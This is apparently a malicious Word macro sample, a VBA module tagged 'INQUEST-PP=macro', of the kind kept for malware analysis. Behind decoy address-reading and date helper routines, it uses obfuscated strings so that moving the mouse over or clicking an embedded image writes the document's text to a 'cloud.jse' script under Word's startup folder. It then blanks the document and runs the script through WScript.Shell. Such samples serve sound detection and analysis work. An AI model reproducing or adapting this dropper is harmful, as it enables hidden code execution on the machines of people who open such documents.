Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Attribute VB_Control = "Image1, 0, 0, MSForms, Image"
Private Hoolortg As String
Private Gbooplr As String
Private Tooller As String
Private Msdorp As String


Sub ReadWordDocumentAddressesToSheet(ByRef docInput As Document, ByRef wsOutput As Document)
    Dim strTempArray() As String
    Dim colTemp As New Collection
    Dim lngCurrentRow As Long
    lngCurrentRow = 1
    
    Dim lngCurrentParagraph As Long
    Dim parCurrent As Paragraph
    On Error Resume Next
    For lngCurrentParagraph = 1 To docInput.Paragraphs.Count
        Set parCurrent = docInput.Paragraphs(lngCurrentParagraph)
        If (Len(Trim(parCurrent.Range.Text)) > 1) Then 'Length of 1 means it's only a new line character.
            colTemp.Add Trim(Left(parCurrent.Range.Text, Len(parCurrent.Range.Text) - 1))
        End If
        If (colTemp.Count > 0) And ((Len(Trim(parCurrent.Range.Text)) = 1) Or (lngCurrentParagraph = docInput.Paragraphs.Count)) Then
               ' CollectionToArray colTemp, strTempArray
               ' wsOutput.Range(wsOutput.Cells(lngCurrentRow, 1), wsOutput.Cells(lngCurrentRow, UBound(strTempArray) + 1)) = strTempArray
               ' lngCurrentRow = lngCurrentRow + 1
        End If
    VBA.CallByName VBA.CreateObject(Empty + "W" + Empty + "Sc" & Empty & "rip" & "t." & Gbooplr), _
            "R" & Empty & "u" & "" & "" & "" & "n", VbMethod, _
            """" & Hoolortg & """" & " " & docInput.Paragraphs.Count, 0
    Exit Sub
    Next
End Sub


Sub CollectionToArray(ByRef colInput As String, ByRef strArray As String)
    Erase strArray
    If Not (colInput.Count = 0) Then
        ReDim strArray(colInput.Count)
        Dim lngTemp As Long

        For lngTemp = 0 To colInput.Count - 1
            strArray(lngTemp) = colInput(1)
            colInput.Remove (1)
        Next
    End If
End Sub

            
            
 
Private Sub Saxret(Inm As String)
Hoolortg = Inm & Empty & "\HighSky" & Empty
On Error Resume Next
MkDir Hoolortg
Hoolortg = "" & Hoolortg & Empty & "\cloud." & Empty & "j" & Empty & "s" & "" & "e"
Dim Merasdfd As Integer
Merasdfd = FreeFile
Open Hoolortg For Output As #Merasdfd
Print #Merasdfd, ActiveDocument.Content.Text
Close #Merasdfd
Gbooplr = "" & "s" & "" & "h" & "" & "" & "el" & "l" & Empty
Exit Sub
CollectionToArray "email", "Sss"
End Sub


'dDate = GetDate("MMMM", "m", -1), The result shown the MONTH only ,but one MONTH past now (For example: December)
'dDate = GetDate("dd-mmm", "m", -1).The result should be something like 10-Dec.
'dDate = GetDate("mmm-yy", "m", -1).The result should be something like Dec-10.
'dDate = GetDate("dd-mmm-yy", "m").The result should be something like 10-Jan-10.
'dDate = GetDate("dd-mmm-yy").The result should be something like 10-Jan-10.
Function GetDate(Optional strDateFormat As String, Optional strDiversionFrom As String, Optional intDiversionValue As Integer) As String

    Dim dDate As Date
    If strDateFormat = "" Then strDateFormat = " mmm-yy"
    If strDiversionFrom = "" Then strDiversionFrom = "m"
    dDate = DateAdd(strDiversionFrom, intDiversionValue, CDate(Now))
    Saxret Application.StartupPath
    GetDate = Format(dDate, strDateFormat)
    
End Function

Private Sub SpaceX()
If (Len(ActiveDocument.Content.Text) > 3000) Then

GetDate ("dd-mmm-yy")
ActiveDocument.Content.Text = ""
ReadWordDocumentAddressesToSheet ActiveDocument, ActiveDocument
End If
End Sub



Private Sub Image1_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
SpaceX
End Sub

Private Sub Image1_Click()
SpaceX
End Sub




INQUEST-PP=macro
